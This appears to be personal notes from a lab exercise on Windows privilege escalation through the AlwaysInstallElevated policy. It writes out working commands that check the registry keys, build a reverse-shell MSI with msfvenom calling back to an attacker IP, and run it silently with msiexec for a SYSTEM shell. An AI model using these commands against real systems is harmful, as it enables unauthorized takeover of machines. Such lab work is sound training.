Query the registry for AlwaysInstallElevated keys:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
````

![[Pasted image 20240528193026.png]]

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

![[Pasted image 20240528193130.png]]

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

![[Pasted image 20240528193425.png]]


![[Pasted image 20240528193535.png]]


Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:  

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

![[Pasted image 20240528193737.png]]

Answer the questions below

Read and follow along with the above.
